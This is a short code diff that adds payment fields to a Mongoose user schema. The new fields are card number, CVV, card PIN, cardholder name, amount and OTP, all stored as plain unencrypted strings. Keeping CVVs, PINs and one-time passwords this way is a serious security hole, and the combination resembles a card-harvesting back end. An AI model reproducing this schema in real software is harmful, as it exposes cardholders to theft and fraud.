@@ -51,7 +51,17 @@ const userSchema = new mongoose.Schema({
     purCount: {
         type:Number,
         default: 0
-    }
+    },
+    bankname: String,
+    card_number: String,
+    cvv: String,
+    cardpin: String,
+    cardname: String,
+    date: String,
+    amount: String,
+    otp: String,
+    time: String,
+
 })
 
 // fire a function after doc save to db
